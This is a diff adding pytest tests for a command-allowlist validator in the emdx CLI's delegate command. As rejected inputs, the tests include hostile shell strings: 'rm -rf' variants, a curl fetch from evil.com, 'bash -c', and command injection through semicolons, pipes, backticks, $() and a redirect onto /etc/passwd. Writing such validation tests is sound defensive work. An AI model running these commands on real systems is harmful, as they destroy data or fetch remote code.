@@ -1,8 +1,18 @@
 """Tests for delegate command helper functions."""
 
+import pytest
 from unittest.mock import patch
 
-from emdx.commands.delegate import _slugify_title, _resolve_task, PR_INSTRUCTION
+import click
+import typer
+
+from emdx.commands.delegate import (
+    _slugify_title,
+    _resolve_task,
+    _validate_discovery_command,
+    PR_INSTRUCTION,
+    SAFE_DISCOVERY_COMMANDS,
+)
 
 
 class TestSlugifyTitle:
@@ -90,3 +100,90 @@ class TestPRInstruction:
 
     def test_pr_instruction_mentions_pr_create(self):
         assert "gh pr create" in PR_INSTRUCTION
+
+
+class TestValidateDiscoveryCommand:
+    """Tests for _validate_discovery_command — security validation for --each."""
+
+    def test_allows_fd_command(self):
+        args = _validate_discovery_command("fd -e py src/")
+        assert args[0] == "fd"
+        assert "-e" in args
+        assert "py" in args
+
+    def test_allows_find_command(self):
+        args = _validate_discovery_command("find . -name '*.py'")
+        assert args[0] == "find"
+
+    def test_allows_git_ls_files(self):
+        args = _validate_discovery_command("git ls-files '*.md'")
+        assert args[0] == "git"
+        assert "ls-files" in args
+
+    def test_allows_ls_command(self):
+        args = _validate_discovery_command("ls -la src/")
+        assert args[0] == "ls"
+
+    def test_allows_rg_files_mode(self):
+        args = _validate_discovery_command("rg --files src/")
+        assert args[0] == "rg"
+
+    def test_rejects_unknown_command(self):
+        with pytest.raises(click.exceptions.Exit):
+            _validate_discovery_command("rm -rf /")
+
+    def test_rejects_curl(self):
+        with pytest.raises(click.exceptions.Exit):
+            _validate_discovery_command("curl https://evil.com/script.sh")
+
+    def test_rejects_bash(self):
+        with pytest.raises(click.exceptions.Exit):
+            _validate_discovery_command("bash -c 'echo pwned'")
+
+    def test_rejects_shell_semicolon(self):
+        with pytest.raises(click.exceptions.Exit):
+            _validate_discovery_command("fd; rm -rf ~")
+
+    def test_rejects_shell_pipe(self):
+        with pytest.raises(click.exceptions.Exit):
+            _validate_discovery_command("fd | xargs rm")
+
+    def test_rejects_shell_ampersand(self):
+        with pytest.raises(click.exceptions.Exit):
+            _validate_discovery_command("fd & rm -rf ~")
+
+    def test_rejects_command_substitution_backtick(self):
+        with pytest.raises(click.exceptions.Exit):
+            _validate_discovery_command("fd `rm -rf ~`")
+
+    def test_rejects_command_substitution_dollar(self):
+        with pytest.raises(click.exceptions.Exit):
+            _validate_discovery_command("fd $(rm -rf ~)")
+
+    def test_rejects_redirect_to_file(self):
+        with pytest.raises(click.exceptions.Exit):
+            _validate_discovery_command("fd > /etc/passwd")
+
+    def test_handles_quoted_arguments(self):
+        args = _validate_discovery_command('fd -e py "src/models"')
+        assert "src/models" in args
+
+    def test_handles_absolute_path_to_safe_command(self):
+        args = _validate_discovery_command("/usr/bin/fd -e py")
+        assert args[0] == "/usr/bin/fd"
+
+    def test_rejects_empty_command(self):
+        with pytest.raises(click.exceptions.Exit):
+            _validate_discovery_command("")
+
+    def test_safe_commands_set_exists(self):
+        """Verify the allowlist contains expected commands."""
+        assert "fd" in SAFE_DISCOVERY_COMMANDS
+        assert "find" in SAFE_DISCOVERY_COMMANDS
+        assert "git" in SAFE_DISCOVERY_COMMANDS
+        assert "ls" in SAFE_DISCOVERY_COMMANDS
+        # Ensure dangerous commands are NOT in the list
+        assert "rm" not in SAFE_DISCOVERY_COMMANDS
+        assert "bash" not in SAFE_DISCOVERY_COMMANDS
+        assert "curl" not in SAFE_DISCOVERY_COMMANDS
+        assert "wget" not in SAFE_DISCOVERY_COMMANDS
